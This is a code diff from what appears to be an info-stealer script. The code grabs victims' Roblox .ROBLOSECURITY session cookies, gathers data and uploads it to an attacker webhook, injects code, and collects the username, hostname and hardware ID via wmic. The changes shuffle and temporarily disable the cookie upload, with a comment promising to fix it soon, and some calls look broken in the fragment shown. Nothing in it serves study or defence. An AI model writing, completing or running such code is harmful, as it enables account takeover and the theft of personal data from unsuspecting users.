@@ -333,6 +333,7 @@ def RobloxCookie(path, arg):
 
 
 def UploadRobloxCookie(webhook):
+    return
     headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
     info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
     data = {
@@ -899,6 +900,8 @@ GamingZip = []
 OtherZip = []
 
 GatherAll()
+RobloxCookie() # Fixing this shit soon
+UploadRobloxCookie(webhook) # Fixing this shit soon
 injection.InjectionX(webhook)
 DETECTED = Trust(Cookies)
 DETECTED = False
@@ -925,21 +928,11 @@ if not DETECTED:
             filetext += "\n"
     upload("kiwi", filetext)
 
-    
-name = arg
-path = os.getenv("TEMP") + f"\wp{name}.txt"
-
-RobloxCookie(path, arg)
-UploadRobloxCookie(webhook)
-
 
 username = getpass.getuser()
-
 hostname = socket.gethostname()
-
 hwid = (str(subprocess.check_output("wmic csproduct get uuid"),
             "utf-8").split("\n")[1].strip())
-
 name = (str(subprocess.check_output("wmic csproduct get name"),
             "utf-8").split("\n")[1].strip())
 
